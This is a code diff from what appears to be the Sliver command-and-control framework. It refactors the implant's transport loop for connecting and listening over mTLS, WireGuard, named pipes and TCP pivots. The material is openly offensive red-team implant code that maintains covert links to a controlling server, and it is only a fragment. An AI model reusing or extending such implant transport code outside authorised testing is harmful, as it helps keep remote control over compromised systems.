@@ -26,11 +26,12 @@ import (
 	"fmt"
 	"time"
 
-	// {{if .Config.TCPPivotc2Enabled}}
-	"net"
+	// {{if .Config.TCPc2Enabled}}
+	"github.com/bishopfox/sliver/implant/sliver/transports/tcp"
 	// {{end}}
 
 	// {{if .Config.WGc2Enabled}}
+	"net"
 	"strconv"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
@@ -63,6 +64,7 @@ ConnLoop:
 		// we directly set up the C2 RPC layer here when needed, and we will
 		// skip the mux part below if needed.
 		switch t.uri.Scheme {
+
 		// {{if .Config.MTLSc2Enabled}}
 		case "mtls":
 			// {{if .Config.Debug}}
@@ -81,8 +83,9 @@ ConnLoop:
 
 			break ConnLoop
 			// {{end}} - MTLSc2Enabled
+
+		// {{if .Config.WGc2Enabled}}
 		case "wg":
-			// {{if .Config.WGc2Enabled}}
 			// {{if .Config.Debug}}
 			log.Printf("Connecting -> %s", t.uri.Host)
 			// {{end}}
@@ -126,9 +129,9 @@ ConnLoop:
 			break ConnLoop
 			// {{end}}
 
+		// {{if .Config.NamePipec2Enabled}}
 		case "namedpipe":
-			// {{if .Config.NamePipec2Enabled}}
-			t.Conn, err = namedpipe.NamedPipeConnect(t.uri)
+			t.Conn, err = namedpipe.Dial(t.uri, t.Profile)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Connection failed: %s", err)
@@ -138,10 +141,10 @@ ConnLoop:
 			}
 			break ConnLoop
 			// {{end}} -NamePipec2Enabled
-		case "tcppivot":
-			// {{if .Config.TCPPivotc2Enabled}}
-			addr := fmt.Sprintf("%s:%s", t.uri.Hostname(), t.uri.Port())
-			t.Conn, err = net.Dial("tcp", addr)
+
+		// {{if .Config.TCPc2Enabled}}
+		case "tcp":
+			t.Conn, err = tcp.Dial(t.uri, t.Profile)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[tcppivot] Connection failed: %s", err)
@@ -150,7 +153,7 @@ ConnLoop:
 				continue
 			}
 			break ConnLoop
-			// {{end}} -TCPPivotc2Enabled
+			// {{end}} -TCPc2Enabled
 		default:
 			err = fmt.Errorf("Unknown c2 protocol: %s", t.uri.Scheme)
 			// {{if .Config.Debug}}
@@ -200,21 +203,42 @@ ConnLoop:
 				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
 				t.attempts++
+				continue
 			}
 			break ConnLoop
 			// {{end}} - MTLSc2Enabled
 
-		case "namedpipe", "named_pipe", "pipe":
 			// {{if .Config.NamePipec2Enabled}}
-			// t.C2, err = comm.Dial(t.uri)
-			// if err != nil {
-			//         // {{if .Config.Debug}}
-			//         log.Printf("[namedpipe] Connection failed: %s", err)
-			//         // {{end}}
-			//         t.attempts++
-			// }
-			// break ConnLoop
+		case "namedpipe", "named_pipe", "pipe":
+			t.Conn, err = namedpipe.Listen(t.uri, t.Profile)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Connection failed: %s", err)
+				// {{end}}
+				t.attempts++
+				continue
+			}
+			break ConnLoop
 			// {{end}} -NamePipec2Enabled
+
+			// {{if .Config.TCPc2Enabled}}
+		case "tcp":
+			// {{if .Config.Debug}}
+			log.Printf("Listening on %s", t.uri.Host)
+			// {{end}}
+
+			// Get physical
+			t.Conn, err = tcp.Listen(t.uri, t.Profile)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[mtls] Connection failed: %s", err)
+				// {{end}}
+				t.attempts++
+				continue
+			}
+			break ConnLoop
+			// {{end}} - TCPc2Enabled
+
 		default:
 			// {{if .Config.Debug}}
 			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
